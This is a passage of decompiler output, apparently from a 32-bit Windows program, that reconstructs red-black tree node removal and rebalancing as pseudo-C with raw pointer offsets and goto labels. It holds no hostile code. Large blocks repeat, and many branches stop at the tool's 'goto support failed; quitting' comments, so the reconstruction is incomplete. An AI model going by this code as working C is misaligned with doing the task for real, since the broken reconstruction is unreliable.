                                            *(int32_t *)(v6 + 20) = v8;
                                            // branch -> 0x40899d
                                            // 0x40899d
                                            _qm__qm_1_Lockit_std__QAE_XZ();
                                            g1 = v20;
                                            function_4097fe((char *)v20);
                                            v58 = (int32_t *)(v9 + 12);
                                            v59 = v1;
                                            g4 = v59;
                                            *v58 = *v58 - 1;
                                            g5 = v3;
                                            *a1 = v59;
                                            return result;
                                        }
                                        // 0x4088dc
                                        v91 = *(int32_t *)(v90 + 4);
                                        g6 = v91;
                                        v72 = (int32_t *)v91;
                                        if (v90 == *v72) {
                                            // 0x4088e3
                                            *v72 = v19;
                                            *(int32_t *)v19 = v18;
                                            // branch -> 0x408997
                                            // 0x408997
                                            *(int32_t *)(v18 + 4) = v19;
                                            // branch -> 0x40899a
                                            // 0x40899a
                                            *(int32_t *)(v6 + 20) = v8;
                                            // branch -> 0x40899d
                                            // 0x40899d
                                            _qm__qm_1_Lockit_std__QAE_XZ();
                                            g1 = v20;
                                            function_4097fe((char *)v20);
                                            v58 = (int32_t *)(v9 + 12);
                                            v59 = v1;
                                            g4 = v59;
                                            *v58 = *v58 - 1;
                                            g5 = v3;
                                            *a1 = v59;
                                            return result;
                                        }
                                        // 0x4088ec
                                        *(int32_t *)(v91 + 8) = v19;
                                        *(int32_t *)v19 = v18;
                                        // branch -> 0x408997
                                        // 0x408997
                                        *(int32_t *)(v18 + 4) = v19;
                                        // branch -> 0x40899a
                                        // 0x40899a
                                        *(int32_t *)(v6 + 20) = v8;
                                        // branch -> 0x40899d
                                        // 0x40899d
                                        _qm__qm_1_Lockit_std__QAE_XZ();
                                        g1 = v20;
                                        function_4097fe((char *)v20);
                                        v58 = (int32_t *)(v9 + 12);
                                        v59 = v1;
                                        g4 = v59;
                                        *v58 = *v58 - 1;
                                        g5 = v3;
                                        *a1 = v59;
                                        return result;
                                    }
                                  lab_0x4087c3_9:;
                                    int32_t * v105 = (int32_t *)(v35 + 20); // 0x4087c3_0
                                    int32_t v106 = v26; // 0x40894686
                                    int32_t v107 = v52; // 0x408900
                                    int32_t v108 = v35; // 0x4088fd
                                    int32_t * v109; // 0x408816_0
                                    int32_t * v110; // 0x408822_0
                                    int32_t * v111; // 0x408924_0
                                    int32_t * v112; // 0x408931_0
                                    int32_t * v113; // 0x40895d_0
                                    int32_t * v114; // 0x40897b_0
                                    int32_t * v115; // 0x408988_0
                                    int32_t v116; // 0x40890e
                                    int32_t v117; // 0x40890e
                                    int32_t v118; // 0x408944
                                    int32_t v119; // 0x40895d
                                    int32_t v120; // 0x408903
                                    int32_t v121; // 0x40891e
                                    int32_t v122; // 0x408941
                                    int32_t v123; // 0x408946
                                    int32_t v124; // 0x40894c
                                    int32_t v125; // 0x408964
                                    int32_t v126; // 0x408975
                                    int32_t v127; // 0x408924
                                    int32_t v128; // 0x40892e
                                    int32_t v129; // 0x40895a
                                    int32_t v130; // 0x408964
                                    int32_t v131; // 0x408978
                                    int32_t v132; // 0x40897b
                                    int32_t v133; // 0x408985
                                    int32_t v134; // 0x40898d
                                    if (*v105 == v1) {
                                        // 0x4087c8
                                        *v105 = v52;
                                        *(int32_t *)(*(int32_t *)(v6 + 4) + 20) = v1;
                                        int32_t v135 = *(int32_t *)(v6 + 4); // 0x4087d1
                                        v18 = v135;
                                        int32_t * v136 = (int32_t *)v135; // 0x4087d4_0
                                        int32_t v137 = *v136; // 0x4087d4
                                        v19 = v137;
                                        *v136 = *(int32_t *)(v137 + 8);
                                        int32_t v138 = *(int32_t *)(v19 + 8); // 0x4087db
                                        if (v138 != g1178) {
                                            // 0x4087e6
                                            *(int32_t *)(v138 + 4) = v18;
                                            // branch -> 0x4087e9
                                        }
                                        // 0x4087e9
                                        *(int32_t *)(v19 + 4) = *(int32_t *)(v18 + 4);
                                        int32_t v139 = v18; // 0x4087f2
                                        int32_t * v140 = (int32_t *)(*(int32_t *)(v9 + 4) + 4); // 0x4087f2_0
                                        int32_t v141; // 0x408814
                                        int32_t v142; // 0x408811
                                        if (v139 == *v140) {
                                            // 0x4087f7
                                            *v140 = v19;
                                            // branch -> 0x40880b
                                        } else {
                                            int32_t v143 = *(int32_t *)(v139 + 4); // 0x4087fc
                                            int32_t * v144 = (int32_t *)(v143 + 8); // 0x4087ff_0
                                            int32_t v145 = v19; // 0x408804
                                            if (v139 == *v144) {
                                                // 0x408804
                                                *v144 = v145;
                                                // branch -> 0x40880b
                                            } else {
                                                // 0x408809
                                                *(int32_t *)v143 = v145;
                                                // branch -> 0x40880b
                                            }
                                            // 0x40880b
                                            *(int32_t *)(v19 + 8) = v18;
                                            *(int32_t *)(v18 + 4) = v19;
                                            v142 = v6;
                                            v141 = *(int32_t *)*(int32_t *)(v142 + 4);
                                            v18 = v141;
                                            v106 = v142;
                                            v107 = v8;
                                            v108 = v141;
                                            // branch -> 0x408816
                                          lab_0x408816:
                                            // 0x408816
                                            v109 = (int32_t *)(v108 + 8);
                                            v110 = (int32_t *)v108;
                                            if (*(int32_t *)(*v109 + 20) == v107) {
                                              lab_0x408822:;
                                                int32_t v146 = *v110; // 0x408822
                                                g6 = v146;
                                                if (*(int32_t *)(v146 + 20) == v107) {
                                                    v60 = v108;
                                                    goto lab_0x40882d;
                                                }
                                                // 0x4088f6
                                                v124 = v108;
                                                v123 = v106;
                                                if (*(int32_t *)(*v110 + 20) == v107) {
                                                    // 0x4088fd
                                                    *(int32_t *)(*v109 + 20) = v107;
                                                    v120 = v18;
                                                    v19 = *(int32_t *)(v120 + 8);
                                                    *(int32_t *)(v120 + 20) = v1;
                                                    *(int32_t *)(v18 + 8) = *(int32_t *)v19;
                                                    v116 = v19;
                                                    v117 = *(int32_t *)v116;
                                                    v121 = v116;
                                                    if (v117 != g1178) {
                                                        // 0x408918
                                                        *(int32_t *)(v117 + 4) = v18;
                                                        v121 = v19;
                                                        // branch -> 0x40891b
                                                    }
                                                    // 0x40891b
                                                    *(int32_t *)(v121 + 4) = *(int32_t *)(v18 + 4);
                                                    v127 = v18;
                                                    v111 = (int32_t *)(*(int32_t *)(v9 + 4) + 4);
                                                    if (v127 == *v111) {
                                                        // 0x408929
                                                        *v111 = v19;
                                                        // branch -> 0x40893c
                                                    } else {
                                                        // 0x40892e
                                                        v128 = *(int32_t *)(v127 + 4);
                                                        v112 = (int32_t *)v128;
                                                        if (v127 == *v112) {
                                                            // 0x408935
                                                            *v112 = v19;
                                                            // branch -> 0x40893c
                                                        } else {
                                                            // 0x408939
                                                            *(int32_t *)(v128 + 8) = v19;
                                                            // branch -> 0x40893c
                                                        }
                                                        // 0x40893c
                                                        *(int32_t *)v19 = v18;
                                                        *(int32_t *)(v18 + 4) = v19;
                                                        v122 = v6;
                                                        v118 = *(int32_t *)*(int32_t *)(v122 + 4);
                                                        // branch -> 0x408946
                                                        // 0x408946
                                                        *(int32_t *)(v118 + 20) = *(int32_t *)(*(int32_t *)(v122 + 4) + 20);
                                                        *(int32_t *)(*(int32_t *)(v6 + 4) + 20) = v8;
                                                        *(int32_t *)(*(int32_t *)v118 + 20) = v8;
                                                        v129 = *(int32_t *)(v6 + 4);
                                                        v18 = v129;
                                                        v113 = (int32_t *)v129;
                                                        v119 = *v113;
                                                        v19 = v119;
                                                        *v113 = *(int32_t *)(v119 + 8);
                                                        v125 = v19;
                                                        v130 = *(int32_t *)(v125 + 8);
                                                        v126 = v125;
                                                        if (v130 != g1178) {
                                                            // 0x40896f
                                                            *(int32_t *)(v130 + 4) = v18;
                                                            v126 = v19;
                                                            // branch -> 0x408972
                                                        }
                                                        // 0x408972
                                                        *(int32_t *)(v126 + 4) = *(int32_t *)(v18 + 4);
                                                        v131 = *(int32_t *)(v9 + 4);
                                                        g6 = v131;
                                                        v132 = v18;
                                                        v114 = (int32_t *)(v131 + 4);
                                                        if (v132 == *v114) {
                                                            // 0x408980
                                                            *v114 = v19;
                                                            // branch -> 0x408994
                                                            // 0x408994
                                                            *(int32_t *)(v19 + 8) = v18;
                                                            // branch -> 0x408997
                                                            // 0x408997
                                                            *(int32_t *)(v18 + 4) = v19;
                                                            // branch -> 0x40899a
                                                            // 0x40899a
                                                            *(int32_t *)(v6 + 20) = v8;
                                                            // branch -> 0x40899d
                                                            // 0x40899d
                                                            _qm__qm_1_Lockit_std__QAE_XZ();
                                                            g1 = v20;
                                                            function_4097fe((char *)v20);
                                                            v58 = (int32_t *)(v9 + 12);
                                                            v59 = v1;
                                                            g4 = v59;
                                                            *v58 = *v58 - 1;
                                                            g5 = v3;
                                                            *a1 = v59;
                                                            return result;
                                                        }
                                                        // 0x408985
                                                        v133 = *(int32_t *)(v132 + 4);
                                                        g6 = v133;
                                                        v115 = (int32_t *)(v133 + 8);
                                                        v134 = v19;
                                                        if (v132 == *v115) {
                                                            // 0x40898d
                                                            *v115 = v134;
                                                            // branch -> 0x408994
                                                            // 0x408994
                                                            *(int32_t *)(v19 + 8) = v18;
                                                            // branch -> 0x408997
                                                            // 0x408997
                                                            *(int32_t *)(v18 + 4) = v19;
                                                            // branch -> 0x40899a
                                                            // 0x40899a
                                                            *(int32_t *)(v6 + 20) = v8;
                                                            // branch -> 0x40899d
                                                            // 0x40899d
                                                            _qm__qm_1_Lockit_std__QAE_XZ();
                                                            g1 = v20;
                                                            function_4097fe((char *)v20);
                                                            v58 = (int32_t *)(v9 + 12);
                                                            v59 = v1;
                                                            g4 = v59;
                                                            *v58 = *v58 - 1;
                                                            g5 = v3;
                                                            *a1 = v59;
                                                            return result;
                                                        }
                                                        // 0x408992
                                                        *(int32_t *)v133 = v134;
                                                        // branch -> 0x408994
                                                        // 0x408994
                                                        *(int32_t *)(v19 + 8) = v18;
                                                        // branch -> 0x408997
                                                        // 0x408997
                                                        *(int32_t *)(v18 + 4) = v19;
                                                        // branch -> 0x40899a
                                                        // 0x40899a
                                                        *(int32_t *)(v6 + 20) = v8;
                                                        // branch -> 0x40899d
                                                        // 0x40899d
                                                        _qm__qm_1_Lockit_std__QAE_XZ();
                                                        g1 = v20;
                                                        function_4097fe((char *)v20);
                                                        v58 = (int32_t *)(v9 + 12);
                                                        v59 = v1;
                                                        g4 = v59;
                                                        *v58 = *v58 - 1;
                                                        g5 = v3;
                                                        *a1 = v59;
                                                        return result;
                                                    }
                                                    // 0x40893c
                                                    *(int32_t *)v19 = v18;
                                                    *(int32_t *)(v18 + 4) = v19;
                                                    v122 = v6;
                                                    v118 = *(int32_t *)*(int32_t *)(v122 + 4);
                                                    v18 = v118;
                                                    v124 = v118;
                                                    v123 = v122;
                                                    // branch -> 0x408946
                                                }
                                                // 0x408946
                                                *(int32_t *)(v124 + 20) = *(int32_t *)(*(int32_t *)(v123 + 4) + 20);
                                                *(int32_t *)(*(int32_t *)(v6 + 4) + 20) = v8;
                                                *(int32_t *)(*(int32_t *)v18 + 20) = v8;
                                                v129 = *(int32_t *)(v6 + 4);
                                                v18 = v129;
                                                v113 = (int32_t *)v129;
                                                v119 = *v113;
                                                v19 = v119;
                                                *v113 = *(int32_t *)(v119 + 8);
                                                v125 = v19;
                                                v130 = *(int32_t *)(v125 + 8);
                                                v126 = v125;
                                                if (v130 != g1178) {
                                                    // 0x40896f
                                                    *(int32_t *)(v130 + 4) = v18;
                                                    v126 = v19;
                                                    // branch -> 0x408972
                                                }
                                                // 0x408972
                                                *(int32_t *)(v126 + 4) = *(int32_t *)(v18 + 4);
                                                v131 = *(int32_t *)(v9 + 4);
                                                g6 = v131;
                                                v132 = v18;
                                                v114 = (int32_t *)(v131 + 4);
                                                if (v132 == *v114) {
                                                    // 0x408980
                                                    *v114 = v19;
                                                    // branch -> 0x408994
                                                    // 0x408994
                                                    *(int32_t *)(v19 + 8) = v18;
                                                    // branch -> 0x408997
                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                } else {
                                                    // 0x408985
                                                    v133 = *(int32_t *)(v132 + 4);
                                                    g6 = v133;
                                                    v115 = (int32_t *)(v133 + 8);
                                                    v134 = v19;
                                                    if (v132 == *v115) {
                                                        // 0x40898d
                                                        *v115 = v134;
                                                        // branch -> 0x408994
                                                        // 0x408994
                                                        *(int32_t *)(v19 + 8) = v18;
                                                        // branch -> 0x408997
                                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                                    } else {
                                                        // 0x408992
                                                        *(int32_t *)v133 = v134;
                                                        // branch -> 0x408994
                                                        // 0x408994
                                                        *(int32_t *)(v19 + 8) = v18;
                                                        // branch -> 0x408997
                                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                                    }
                                                    // 0x408994
                                                    *(int32_t *)(v19 + 8) = v18;
                                                    // branch -> 0x408997
                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                }
                                                // 0x408994
                                                *(int32_t *)(v19 + 8) = v18;
                                                // branch -> 0x408997
                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                            }
                                            // 0x4088f6
                                            v124 = v108;
                                            v123 = v106;
                                            if (*(int32_t *)(*v110 + 20) == v107) {
                                                // 0x4088fd
                                                *(int32_t *)(*v109 + 20) = v107;
                                                v120 = v18;
                                                v19 = *(int32_t *)(v120 + 8);
                                                *(int32_t *)(v120 + 20) = v1;
                                                *(int32_t *)(v18 + 8) = *(int32_t *)v19;
                                                v116 = v19;
                                                v117 = *(int32_t *)v116;
                                                v121 = v116;
                                                if (v117 != g1178) {
                                                    // 0x408918
                                                    *(int32_t *)(v117 + 4) = v18;
                                                    v121 = v19;
                                                    // branch -> 0x40891b
                                                }
                                                // 0x40891b
                                                *(int32_t *)(v121 + 4) = *(int32_t *)(v18 + 4);
                                                v127 = v18;
                                                v111 = (int32_t *)(*(int32_t *)(v9 + 4) + 4);
                                                if (v127 == *v111) {
                                                    // 0x408929
                                                    *v111 = v19;
                                                    // branch -> 0x40893c
                                                } else {
                                                    // 0x40892e
                                                    v128 = *(int32_t *)(v127 + 4);
                                                    v112 = (int32_t *)v128;
                                                    if (v127 == *v112) {
                                                        // 0x408935
                                                        *v112 = v19;
                                                        // branch -> 0x40893c
                                                    } else {
                                                        // 0x408939
                                                        *(int32_t *)(v128 + 8) = v19;
                                                        // branch -> 0x40893c
                                                    }
                                                    // 0x40893c
                                                    *(int32_t *)v19 = v18;
                                                    *(int32_t *)(v18 + 4) = v19;
                                                    v122 = v6;
                                                    v118 = *(int32_t *)*(int32_t *)(v122 + 4);
                                                    // branch -> 0x408946
                                                    // 0x408946
                                                    *(int32_t *)(v118 + 20) = *(int32_t *)(*(int32_t *)(v122 + 4) + 20);
                                                    *(int32_t *)(*(int32_t *)(v6 + 4) + 20) = v8;
                                                    *(int32_t *)(*(int32_t *)v118 + 20) = v8;
                                                    v129 = *(int32_t *)(v6 + 4);
                                                    v18 = v129;
                                                    v113 = (int32_t *)v129;
                                                    v119 = *v113;
                                                    v19 = v119;
                                                    *v113 = *(int32_t *)(v119 + 8);
                                                    v125 = v19;
                                                    v130 = *(int32_t *)(v125 + 8);
                                                    v126 = v125;
                                                    if (v130 != g1178) {
                                                        // 0x40896f
                                                        *(int32_t *)(v130 + 4) = v18;
                                                        v126 = v19;
                                                        // branch -> 0x408972
                                                    }
                                                    // 0x408972
                                                    *(int32_t *)(v126 + 4) = *(int32_t *)(v18 + 4);
                                                    v131 = *(int32_t *)(v9 + 4);
                                                    g6 = v131;
                                                    v132 = v18;
                                                    v114 = (int32_t *)(v131 + 4);
                                                    if (v132 == *v114) {
                                                        // 0x408980
                                                        *v114 = v19;
                                                        // branch -> 0x408994
                                                        // 0x408994
                                                        *(int32_t *)(v19 + 8) = v18;
                                                        // branch -> 0x408997
                                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                                    } else {
                                                        // 0x408985
                                                        v133 = *(int32_t *)(v132 + 4);
                                                        g6 = v133;
                                                        v115 = (int32_t *)(v133 + 8);
                                                        v134 = v19;
                                                        if (v132 == *v115) {
                                                            // 0x40898d
                                                            *v115 = v134;
                                                            // branch -> 0x408994
                                                            // 0x408994
                                                            *(int32_t *)(v19 + 8) = v18;
                                                            // branch -> 0x408997
                                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                                        } else {
                                                            // 0x408992
                                                            *(int32_t *)v133 = v134;
                                                            // branch -> 0x408994
                                                            // 0x408994
                                                            *(int32_t *)(v19 + 8) = v18;
                                                            // branch -> 0x408997
                                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                                        }
                                                        // 0x408994
                                                        *(int32_t *)(v19 + 8) = v18;
                                                        // branch -> 0x408997
                                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                                    }
                                                    // 0x408994
                                                    *(int32_t *)(v19 + 8) = v18;
                                                    // branch -> 0x408997
                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                }
                                                // 0x40893c
                                                *(int32_t *)v19 = v18;
                                                *(int32_t *)(v18 + 4) = v19;
                                                v122 = v6;
                                                v118 = *(int32_t *)*(int32_t *)(v122 + 4);
                                                v18 = v118;
                                                v124 = v118;
                                                v123 = v122;
                                                // branch -> 0x408946
                                            }
                                            // 0x408946
                                            *(int32_t *)(v124 + 20) = *(int32_t *)(*(int32_t *)(v123 + 4) + 20);
                                            *(int32_t *)(*(int32_t *)(v6 + 4) + 20) = v8;
                                            *(int32_t *)(*(int32_t *)v18 + 20) = v8;
                                            v129 = *(int32_t *)(v6 + 4);
                                            v18 = v129;
                                            v113 = (int32_t *)v129;
                                            v119 = *v113;
                                            v19 = v119;
                                            *v113 = *(int32_t *)(v119 + 8);
                                            v125 = v19;
                                            v130 = *(int32_t *)(v125 + 8);
                                            v126 = v125;
                                            if (v130 != g1178) {
                                                // 0x40896f
                                                *(int32_t *)(v130 + 4) = v18;
                                                v126 = v19;
                                                // branch -> 0x408972
                                            }
                                            // 0x408972
                                            *(int32_t *)(v126 + 4) = *(int32_t *)(v18 + 4);
                                            v131 = *(int32_t *)(v9 + 4);
                                            g6 = v131;
                                            v132 = v18;
                                            v114 = (int32_t *)(v131 + 4);
                                            if (v132 == *v114) {
                                                // 0x408980
                                                *v114 = v19;
                                                // branch -> 0x408994
                                                // 0x408994
                                                *(int32_t *)(v19 + 8) = v18;
                                                // branch -> 0x408997
                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                            } else {
                                                // 0x408985
                                                v133 = *(int32_t *)(v132 + 4);
                                                g6 = v133;
                                                v115 = (int32_t *)(v133 + 8);
                                                v134 = v19;
                                                if (v132 == *v115) {
                                                    // 0x40898d
                                                    *v115 = v134;
                                                    // branch -> 0x408994
                                                    // 0x408994
                                                    *(int32_t *)(v19 + 8) = v18;
                                                    // branch -> 0x408997
                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                } else {
                                                    // 0x408992
                                                    *(int32_t *)v133 = v134;
                                                    // branch -> 0x408994
                                                    // 0x408994
                                                    *(int32_t *)(v19 + 8) = v18;
                                                    // branch -> 0x408997
                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                }
                                                // 0x408994
                                                *(int32_t *)(v19 + 8) = v18;
                                                // branch -> 0x408997
                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                            }
                                            // 0x408994
                                            *(int32_t *)(v19 + 8) = v18;
                                            // branch -> 0x408997
                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                        }
                                        // 0x40880b
                                        *(int32_t *)(v19 + 8) = v18;
                                        *(int32_t *)(v18 + 4) = v19;
                                        v142 = v6;
                                        v141 = *(int32_t *)*(int32_t *)(v142 + 4);
                                        v18 = v141;
                                        v106 = v142;
                                        v107 = v8;
                                        v108 = v141;
                                        // branch -> 0x408816
                                        goto lab_0x408816;
                                    }
                                    // 0x408816
                                    v109 = (int32_t *)(v108 + 8);
                                    v110 = (int32_t *)v108;
                                    if (*(int32_t *)(*v109 + 20) == v107) {
                                        goto lab_0x408822;
                                    }
                                    // 0x4088f6
                                    v124 = v108;
                                    v123 = v106;
                                    if (*(int32_t *)(*v110 + 20) == v107) {
                                        // 0x4088fd
                                        *(int32_t *)(*v109 + 20) = v107;
                                        v120 = v18;
                                        v19 = *(int32_t *)(v120 + 8);
                                        *(int32_t *)(v120 + 20) = v1;
                                        *(int32_t *)(v18 + 8) = *(int32_t *)v19;
                                        v116 = v19;
                                        v117 = *(int32_t *)v116;
                                        v121 = v116;
                                        if (v117 != g1178) {
                                            // 0x408918
                                            *(int32_t *)(v117 + 4) = v18;
                                            v121 = v19;
                                            // branch -> 0x40891b
                                        }
                                        // 0x40891b
                                        *(int32_t *)(v121 + 4) = *(int32_t *)(v18 + 4);
                                        v127 = v18;
                                        v111 = (int32_t *)(*(int32_t *)(v9 + 4) + 4);
                                        if (v127 == *v111) {
                                            // 0x408929
                                            *v111 = v19;
                                            // branch -> 0x40893c
                                        } else {
                                            // 0x40892e
                                            v128 = *(int32_t *)(v127 + 4);
                                            v112 = (int32_t *)v128;
                                            if (v127 == *v112) {
                                                // 0x408935
                                                *v112 = v19;
                                                // branch -> 0x40893c
                                            } else {
                                                // 0x408939
                                                *(int32_t *)(v128 + 8) = v19;
                                                // branch -> 0x40893c
                                            }
                                            // 0x40893c
                                            *(int32_t *)v19 = v18;
                                            *(int32_t *)(v18 + 4) = v19;
                                            v122 = v6;
                                            v118 = *(int32_t *)*(int32_t *)(v122 + 4);
                                            // branch -> 0x408946
                                            // 0x408946
                                            *(int32_t *)(v118 + 20) = *(int32_t *)(*(int32_t *)(v122 + 4) + 20);
                                            *(int32_t *)(*(int32_t *)(v6 + 4) + 20) = v8;
                                            *(int32_t *)(*(int32_t *)v118 + 20) = v8;
                                            v129 = *(int32_t *)(v6 + 4);
                                            v18 = v129;
                                            v113 = (int32_t *)v129;
                                            v119 = *v113;
                                            v19 = v119;
                                            *v113 = *(int32_t *)(v119 + 8);
                                            v125 = v19;
                                            v130 = *(int32_t *)(v125 + 8);
                                            v126 = v125;
                                            if (v130 != g1178) {
                                                // 0x40896f
                                                *(int32_t *)(v130 + 4) = v18;
                                                v126 = v19;
                                                // branch -> 0x408972
                                            }
                                            // 0x408972
                                            *(int32_t *)(v126 + 4) = *(int32_t *)(v18 + 4);
                                            v131 = *(int32_t *)(v9 + 4);
                                            g6 = v131;
                                            v132 = v18;
                                            v114 = (int32_t *)(v131 + 4);
                                            if (v132 == *v114) {
                                                // 0x408980
                                                *v114 = v19;
                                                // branch -> 0x408994
                                                // 0x408994
                                                *(int32_t *)(v19 + 8) = v18;
                                                // branch -> 0x408997
                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                            } else {
                                                // 0x408985
                                                v133 = *(int32_t *)(v132 + 4);
                                                g6 = v133;
                                                v115 = (int32_t *)(v133 + 8);
                                                v134 = v19;
                                                if (v132 == *v115) {
                                                    // 0x40898d
                                                    *v115 = v134;
                                                    // branch -> 0x408994
                                                    // 0x408994
                                                    *(int32_t *)(v19 + 8) = v18;
                                                    // branch -> 0x408997
                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                } else {
                                                    // 0x408992
                                                    *(int32_t *)v133 = v134;
                                                    // branch -> 0x408994
                                                    // 0x408994
                                                    *(int32_t *)(v19 + 8) = v18;
                                                    // branch -> 0x408997
                                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                                }
                                                // 0x408994
                                                *(int32_t *)(v19 + 8) = v18;
                                                // branch -> 0x408997
                                                // Detected a possible infinite recursion (goto support failed); quitting...
                                            }
                                            // 0x408994
                                            *(int32_t *)(v19 + 8) = v18;
                                            // branch -> 0x408997
                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                        }
                                        // 0x40893c
                                        *(int32_t *)v19 = v18;
                                        *(int32_t *)(v18 + 4) = v19;
                                        v122 = v6;
                                        v118 = *(int32_t *)*(int32_t *)(v122 + 4);
                                        v18 = v118;
                                        v124 = v118;
                                        v123 = v122;
                                        // branch -> 0x408946
                                    }
                                    // 0x408946
                                    *(int32_t *)(v124 + 20) = *(int32_t *)(*(int32_t *)(v123 + 4) + 20);
                                    *(int32_t *)(*(int32_t *)(v6 + 4) + 20) = v8;
                                    *(int32_t *)(*(int32_t *)v18 + 20) = v8;
                                    v129 = *(int32_t *)(v6 + 4);
                                    v18 = v129;
                                    v113 = (int32_t *)v129;
                                    v119 = *v113;
                                    v19 = v119;
                                    *v113 = *(int32_t *)(v119 + 8);
                                    v125 = v19;
                                    v130 = *(int32_t *)(v125 + 8);
                                    v126 = v125;
                                    if (v130 != g1178) {
                                        // 0x40896f
                                        *(int32_t *)(v130 + 4) = v18;
                                        v126 = v19;
                                        // branch -> 0x408972
                                    }
                                    // 0x408972
                                    *(int32_t *)(v126 + 4) = *(int32_t *)(v18 + 4);
                                    v131 = *(int32_t *)(v9 + 4);
                                    g6 = v131;
                                    v132 = v18;
                                    v114 = (int32_t *)(v131 + 4);
                                    if (v132 == *v114) {
                                        // 0x408980
                                        *v114 = v19;
                                        // branch -> 0x408994
                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                    } else {
                                        // 0x408985
                                        v133 = *(int32_t *)(v132 + 4);
                                        g6 = v133;
                                        v115 = (int32_t *)(v133 + 8);
                                        v134 = v19;
                                        if (v132 == *v115) {
                                            // 0x40898d
                                            *v115 = v134;
                                            // branch -> 0x408994
                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                        } else {
                                            // 0x408992
                                            *(int32_t *)v133 = v134;
                                            // branch -> 0x408994
                                            // Detected a possible infinite recursion (goto support failed); quitting...
                                        }
                                        // Detected a possible infinite recursion (goto support failed); quitting...
                                    }
                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                    // 0x40882d
                                    *(int32_t *)(v60 + 20) = v1;
                                    v61 = *(int32_t *)(v6 + 4);
                                    v6 = v61;
                                    if (v61 != *(int32_t *)(*(int32_t *)(v9 + 4) + 4)) {
                                        goto lab_0x40882d_2;
                                    }
                                    // 0x40899a
                                    // branch -> 0x40899a
                                    // Detected a possible infinite recursion (goto support failed); quitting...
                                }
                                // 0x40899a
                                // branch -> 0x40899a
                                // Detected a possible infinite recursion (goto support failed); quitting...
                            }
                            // 0x40899a
                            // branch -> 0x40899a
                        }
                        // Detected a possible infinite recursion (goto support failed); quitting...
                    }
                    // Detected a possible infinite recursion (goto support failed); quitting...
                }
                // 0x4086f3
                v17 = (int32_t *)(*(int32_t *)(v39 + 4) + 8);
                v45 = *v17;
                if (v45 == v1) {
                    // 0x4086fb
                    v34 = g1178;
                    if (*(int32_t *)v45 == v34) {
                        // 0x408707
                        v48 = *(int32_t *)(v45 + 4);
                        // branch -> 0x40871e
                    } else {
                        // 0x40870c
                        v40 = v6;
                        v46 = *(int32_t *)(v40 + 8);
                        if (v46 != v34) {
                            v25 = v46;
                            v47 = *(int32_t *)(v25 + 8);
                            while (v47 != v34) {
                                // 0x408715
                                v25 = v47;
                                v47 = *(int32_t *)(v25 + 8);
                                // continue -> 0x408715
                            }
                            // 0x40871e
                            v48 = v25;
                            // branch -> 0x40871e
                        } else {
                            v48 = v40;
                        }
                    }
                    // 0x40871e
                    *v17 = v48;
                    // branch -> 0x408721
                }
                // 0x408721
                v9 = v2;
                v20 = v37;
                // branch -> 0x408725
                // 0x408725
                v8 = 1;
                if (*(int32_t *)(g6 + 20) == 1) {
                    // 0x408735
                    v49 = *(int32_t *)(v9 + 4);
                    g6 = v49;
                    v50 = v6;
                    if (v50 != *(int32_t *)(v49 + 4)) {
                        // 0x408741
                        v1 = 0;
                        if (*(int32_t *)(v50 + 20) == 1) {
                            v26 = v50;
                            v52 = 1;
                            while (true) {
                                // 0x40874c
                                v51 = *(int32_t *)(v26 + 4);
                                v35 = *(int32_t *)v51;
                                v18 = v35;
                                if (v26 == v35) {
                                    goto lab_0x408755_9;
                                }
                                goto lab_0x4087c3_9;
                            }
                        }
                        // 0x40899a
                        // branch -> 0x40899a
                    }
                    // Detected a possible infinite recursion (goto support failed); quitting...
                }
                // Detected a possible infinite recursion (goto support failed); quitting...
            }
            // 0x4086bb
            v38 = v19;
            v16 = (int32_t *)*(int32_t *)(v38 + 4);
            v29 = *v16;
            v39 = v38;
            if (v29 == v1) {
                // 0x4086c6
                v30 = g1178;
                if (*(int32_t *)v8 == v30) {
                    // 0x4086d0
                    *v16 = *(int32_t *)(v29 + 4);
                    v39 = v19;
                    // branch -> 0x4086f3
                } else {
                    // 0x4086d7
                    v23 = v6;
                    v31 = *(int32_t *)v23;
                    v33 = v23;
                    if (v31 != v30) {
                        // 0x4086df
                        v24 = v31;
                        v32 = *(int32_t *)v24;
                        // branch -> 0x4086e1
                        while (v32 != v30) {
                            // 0x4086e1
                            v24 = v32;
                            v32 = *(int32_t *)v24;
                            // continue -> 0x4086e1
                        }
                        // 0x4086e9
                        v33 = v24;
                        // branch -> 0x4086ed
                    }
                    // 0x4086ed
                    *v16 = v33;
                    v39 = v2;
                    // branch -> 0x4086f3
                }
                // 0x4086f3
                v17 = (int32_t *)(*(int32_t *)(v39 + 4) + 8);
                v45 = *v17;
                if (v45 == v1) {
                    // 0x4086fb
                    v34 = g1178;
                    if (*(int32_t *)v45 == v34) {
                        // 0x408707
                        v48 = *(int32_t *)(v45 + 4);
                        // branch -> 0x40871e
                    } else {
                        // 0x40870c
                        v40 = v6;
                        v46 = *(int32_t *)(v40 + 8);
                        if (v46 != v34) {
                            v25 = v46;
                            v47 = *(int32_t *)(v25 + 8);
                            while (v47 != v34) {
                                // 0x408715
                                v25 = v47;
                                v47 = *(int32_t *)(v25 + 8);
                                // continue -> 0x408715
                            }
                            // 0x40871e
                            v48 = v25;
                            // branch -> 0x40871e
                        } else {
                            v48 = v40;
                        }
                    }
                    // 0x40871e
                    *v17 = v48;
                    // branch -> 0x408721
                }
                // 0x408721
                v9 = v2;
                v20 = v37;
                // branch -> 0x408725
                // 0x408725
                v8 = 1;
                if (*(int32_t *)(g6 + 20) == 1) {
                    // 0x408735
                    v49 = *(int32_t *)(v9 + 4);
                    g6 = v49;
